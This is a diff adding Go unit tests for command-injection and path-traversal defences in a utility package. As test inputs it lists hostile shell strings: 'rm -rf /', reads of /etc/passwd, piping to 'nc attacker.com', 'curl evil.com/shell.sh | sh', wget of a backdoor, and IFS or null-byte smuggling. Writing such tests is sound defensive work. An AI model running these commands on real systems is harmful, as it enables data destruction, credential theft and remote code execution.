@@ -1,6 +1,9 @@
 package util
 
 import (
+	"os"
+	"path/filepath"
+	"strings"
 	"testing"
 )
 
@@ -195,6 +198,30 @@ func TestSecureCommand(t *testing.T) {
 			args:    []string{"status", ";", "rm", "-rf", "/"},
 			wantErr: true,
 		},
+		{
+			name:    "backtick injection in args",
+			command: "git",
+			args:    []string{"status", "`cat /etc/passwd`"},
+			wantErr: true,
+		},
+		{
+			name:    "command substitution in args",
+			command: "git",
+			args:    []string{"status", "$(cat /etc/passwd)"},
+			wantErr: true,
+		},
+		{
+			name:    "pipe in args",
+			command: "git",
+			args:    []string{"status", "|", "nc", "attacker.com", "443"},
+			wantErr: true,
+		},
+		{
+			name:    "null byte in args",
+			command: "git",
+			args:    []string{"status\x00"},
+			wantErr: true,
+		},
 	}
 
 	for _, tt := range tests {
@@ -204,5 +231,205 @@ func TestSecureCommand(t *testing.T) {
 				t.Errorf("SecureCommand() error = %v, wantErr %v", err, tt.wantErr)
 			}
 		})
+	}
+}
+
+func TestValidateScriptPath(t *testing.T) {
+	// Create a temporary script for testing
+	tmpDir := t.TempDir()
+	scriptPath := filepath.Join(tmpDir, "scripts", "test.sh")
+	os.MkdirAll(filepath.Dir(scriptPath), 0755)
+	os.WriteFile(scriptPath, []byte("#!/bin/bash\necho test"), 0755)
+
+	// Change to tmp directory for relative path tests
+	originalWd, _ := os.Getwd()
+	os.Chdir(tmpDir)
+	defer os.Chdir(originalWd)
+
+	tests := []struct {
+		name       string
+		scriptPath string
+		wantErr    bool
+	}{
+		{
+			name:       "Valid script in scripts directory",
+			scriptPath: "scripts/test.sh",
+			wantErr:    false,
+		},
+		{
+			name:       "Script with path traversal",
+			scriptPath: "../../../etc/passwd",
+			wantErr:    true,
+		},
+		{
+			name:       "Script outside allowed directories",
+			scriptPath: "/tmp/malicious.sh",
+			wantErr:    true,
+		},
+		{
+			name:       "Empty script path",
+			scriptPath: "",
+			wantErr:    true,
+		},
+		{
+			name:       "Directory instead of script",
+			scriptPath: "scripts",
+			wantErr:    true,
+		},
+		{
+			name:       "Non-existent script",
+			scriptPath: "scripts/nonexistent.sh",
+			wantErr:    true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateScriptPath(tt.scriptPath)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("ValidateScriptPath() error = %v, wantErr %v", err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestSecureCommandWithBash(t *testing.T) {
+	// Create a temporary script for testing
+	tmpDir := t.TempDir()
+	scriptPath := filepath.Join(tmpDir, "scripts", "test.sh")
+	os.MkdirAll(filepath.Dir(scriptPath), 0755)
+	os.WriteFile(scriptPath, []byte("#!/bin/bash\necho test"), 0755)
+
+	// Change to tmp directory for relative path tests
+	originalWd, _ := os.Getwd()
+	os.Chdir(tmpDir)
+	defer os.Chdir(originalWd)
+
+	tests := []struct {
+		name    string
+		command string
+		args    []string
+		wantErr bool
+	}{
+		{
+			name:    "Valid bash script in allowed directory",
+			command: "bash",
+			args:    []string{"scripts/test.sh", "arg1", "arg2"},
+			wantErr: false,
+		},
+		{
+			name:    "Bash script with path traversal",
+			command: "bash",
+			args:    []string{"../../../etc/passwd"},
+			wantErr: true,
+		},
+		{
+			name:    "Bash script outside allowed directories",
+			command: "bash",
+			args:    []string{"/tmp/malicious.sh"},
+			wantErr: true,
+		},
+		{
+			name:    "Bash with command injection in script arg",
+			command: "bash",
+			args:    []string{"scripts/test.sh; rm -rf /"},
+			wantErr: true,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, err := SecureCommand(tt.command, tt.args...)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("SecureCommand() with bash error = %v, wantErr %v", err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestCommandInjectionPrevention(t *testing.T) {
+	maliciousInputs := []string{
+		"script.sh; rm -rf /",
+		"script.sh && cat /etc/passwd",
+		"script.sh | nc attacker.com 443",
+		"${IFS}rm${IFS}-rf${IFS}/",
+		"script.sh`cat /etc/passwd`",
+		"script.sh$(whoami)",
+		"script.sh\nrm -rf /",
+		"script.sh\x00rm -rf /",
+		"../../bin/sh",
+		"script.sh || curl evil.com/shell.sh | sh",
+		"script.sh & disown",
+		"script.sh > /dev/null; wget evil.com/backdoor",
+	}
+
+	for _, input := range maliciousInputs {
+		t.Run("Malicious input: "+input, func(t *testing.T) {
+			// Test as command argument
+			err := validateCommandArg(input)
+			if err == nil {
+				t.Errorf("Expected error for malicious input: %s", input)
+			}
+
+			// Test as script path
+			err = ValidateScriptPath(input)
+			if err == nil {
+				t.Errorf("Expected error for malicious script path: %s", input)
+			}
+
+			// Test with SecureCommand
+			_, err = SecureCommand("bash", input)
+			if err == nil {
+				t.Errorf("Expected error for malicious command: %s", input)
+			}
+		})
+	}
+}
+
+func TestGetSecureEnv(t *testing.T) {
+	// Set some test environment variables
+	os.Setenv("PATH", "/usr/bin:/bin")
+	os.Setenv("HOME", "/home/user")
+	os.Setenv("SECRET_KEY", "super-secret")
+	os.Setenv("DATABASE_PASSWORD", "password123")
+	defer func() {
+		os.Unsetenv("SECRET_KEY")
+		os.Unsetenv("DATABASE_PASSWORD")
+	}()
+
+	env := getSecureEnv()
+
+	// Check that allowed variables are present
+	hasPath := false
+	hasHome := false
+	hasSecret := false
+	hasPassword := false
+
+	for _, e := range env {
+		if strings.HasPrefix(e, "PATH=") {
+			hasPath = true
+		}
+		if strings.HasPrefix(e, "HOME=") {
+			hasHome = true
+		}
+		if strings.Contains(e, "SECRET_KEY") {
+			hasSecret = true
+		}
+		if strings.Contains(e, "DATABASE_PASSWORD") {
+			hasPassword = true
+		}
+	}
+
+	if !hasPath {
+		t.Error("Expected PATH in secure environment")
+	}
+	if !hasHome {
+		t.Error("Expected HOME in secure environment")
+	}
+	if hasSecret {
+		t.Error("SECRET_KEY should not be in secure environment")
+	}
+	if hasPassword {
+		t.Error("DATABASE_PASSWORD should not be in secure environment")
 	}
 }
